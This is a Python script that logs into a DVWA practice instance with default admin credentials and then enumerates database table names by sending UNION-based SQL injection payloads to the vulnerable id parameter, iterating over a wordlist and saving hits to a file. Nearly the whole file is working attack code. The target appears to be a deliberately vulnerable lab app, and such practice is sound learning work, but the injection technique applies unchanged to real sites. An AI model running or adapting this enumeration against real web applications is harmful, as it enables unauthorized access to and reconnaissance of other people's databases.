import aiohttp
import asyncio
import time
from pathlib import Path
from colors import colors

TARGET_IP = "192.168.0.4"


async def login() -> tuple[aiohttp.ClientSession, dict]:
    session = aiohttp.ClientSession()
    cookies = {'PHPSESSID': '12345', 'security': 'low'}
    try:
        payload = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
        }
        async with session.post(
            f'http://{TARGET_IP}/dvwa/login.php',
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies=cookies,
        ) as response:
            print("Status: ", response.status)
            # session_ck, severicy_ck = response.cookies.values()
            await response.release()
            
            return session, cookies
    except Exception:
        session.close()


async def find_table_name(session: aiohttp.ClientSession, table_name: str, cookies: dict = None) -> bool:
    async with session.get(
        f"http://{TARGET_IP}/dvwa/vulnerabilities/sqli/?id=' union select null,null from {table_name} -- &Submit=Submit#",
        cookies=cookies,
        headers={"Connection": "keep-alive"},
    ) as response:
        result = False
        html = await response.text()
        if len(html) < 100:
            print(f"Status: {response.status}. {colors['error']} Not found: {table_name}.{colors['clean']}", html)
        else:
            print(f"{colors['success']}[+] Name found: {table_name}.{colors['clean']}")    
            result = True
        return result


async def main() -> None:
    session, cookies = await login()
    table_list_path = Path("common-sql-table-names.txt")
    table_list = get_list_from_file(table_list_path)
    found_tables = []
    try:
        print(cookies)

        time.sleep(1)
        for table_name in table_list:
            result = await find_table_name(session, table_name, cookies)
            if result:        
                found_tables.append(table_name)
    finally:
        await session.close()

    if len(found_tables) == 0:
        print(f"{colors['info']}Haven't found any table name.{colors['clean']}")
        return

    print(f"{colors['success']}Found tables:\n{', '.join(found_tables)}{colors['clean']}")
    with open("found_tables.txt", 'w', encoding="utf-8") as file:
        for name in found_tables:
            file.write(f"{name}\n")


def get_list_from_file(filename: Path) -> list[str]:
    with open(filename, "r", encoding="utf-8") as file:
        content = file.readlines()
        result_content = [name.strip("\n") for name in content]

    return result_content
        
        
if __name__ == "__main__":
    asyncio.run(main(), debug=True)
